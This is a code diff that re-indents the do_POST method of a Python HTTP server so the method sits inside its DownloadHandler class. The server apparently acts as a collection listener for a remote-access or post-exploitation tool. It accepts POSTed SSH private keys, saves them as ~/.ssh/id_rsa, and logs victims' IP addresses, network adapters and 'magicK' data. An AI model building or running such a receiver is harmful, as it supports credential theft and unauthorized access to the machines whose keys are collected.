@@ -26,56 +26,56 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 			key = ''.join([char for char in key if ord(char) < 128])
 		return key
 		
-def do_POST(self):
-	content_length = int(self.headers['Content-Length'])
-	post_data = self.rfile.read(content_length)
-	current_time = strftime('%Y-%m-%d %H:%M:%S')
-	client_ip = self.client_address[0]
-	
-	stdout.write(f'{Fore.RED}[raw data]{Style.RESET_ALL} {post_data.decode()}\n')
-	stdout.flush()
-	
-	if self.path == '/host':
-		stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n')
-		try:
-			post_json = json.loads(post_data.decode())
-			
-			private_key = post_json.get("PrivateKey", "")
-			if private_key:
-				private_key = self.sanitize_key(private_key)
-				os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
-				private_key_path = os.path.expanduser("~/.ssh/id_rsa")
-				with open(private_key_path, "w") as private_key_file:
-					private_key_file.write(private_key + "\n")
-				os.chmod(private_key_path, 0o600)
-				stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Private key saved to {private_key_path}\n')
-			else:
-				stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
-			
-			adapters = post_json.get("Adapters", [])
-			if isinstance(adapters, list):
-				for adapter in adapters:
-					interface = adapter.get("Interface", "")
-					ip_address = adapter.get("IPAddress", "")
-					if isinstance(interface, str) and isinstance(ip_address, str):
-						stdout.write(f'{Fore.BLUE}[adapter]{Style.RESET_ALL} Interface: {interface}, IP: {ip_address}\n')
-					else:
-						stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Invalid adapter data\n')
-			else:
-				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Adapters data is not a list\n')
+	def do_POST(self):
+		content_length = int(self.headers['Content-Length'])
+		post_data = self.rfile.read(content_length)
+		current_time = strftime('%Y-%m-%d %H:%M:%S')
+		client_ip = self.client_address[0]
+		
+		stdout.write(f'{Fore.RED}[raw data]{Style.RESET_ALL} {post_data.decode()}\n')
+		stdout.flush()
+		
+		if self.path == '/host':
+			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n')
+			try:
+				post_json = json.loads(post_data.decode())
 				
-		except json.JSONDecodeError:
-			stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
-		except Exception as e:
-			stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} {str(e)}\n')
-
-	elif self.path == '/collect':
-		stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
-	else:
-		stdout.write(f'{Fore.YELLOW}[unknown]{Style.RESET_ALL} {current_time} - {client_ip} - Unknown POST request received:\n{post_data.decode()}\n')
-	stdout.flush()
-	self.send_response(200)
-	self.end_headers()
+				private_key = post_json.get("PrivateKey", "")
+				if private_key:
+					private_key = self.sanitize_key(private_key)
+					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
+					private_key_path = os.path.expanduser("~/.ssh/id_rsa")
+					with open(private_key_path, "w") as private_key_file:
+						private_key_file.write(private_key + "\n")
+					os.chmod(private_key_path, 0o600)
+					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Private key saved to {private_key_path}\n')
+				else:
+					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
+				
+				adapters = post_json.get("Adapters", [])
+				if isinstance(adapters, list):
+					for adapter in adapters:
+						interface = adapter.get("Interface", "")
+						ip_address = adapter.get("IPAddress", "")
+						if isinstance(interface, str) and isinstance(ip_address, str):
+							stdout.write(f'{Fore.BLUE}[adapter]{Style.RESET_ALL} Interface: {interface}, IP: {ip_address}\n')
+						else:
+							stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Invalid adapter data\n')
+				else:
+					stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Adapters data is not a list\n')
+					
+			except json.JSONDecodeError:
+				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
+			except Exception as e:
+				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} {str(e)}\n')
+	
+		elif self.path == '/collect':
+			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
+		else:
+			stdout.write(f'{Fore.YELLOW}[unknown]{Style.RESET_ALL} {current_time} - {client_ip} - Unknown POST request received:\n{post_data.decode()}\n')
+		stdout.flush()
+		self.send_response(200)
+		self.end_headers()
 
 def get_local_ip():
 	s = socket(AF_INET, SOCK_DGRAM)
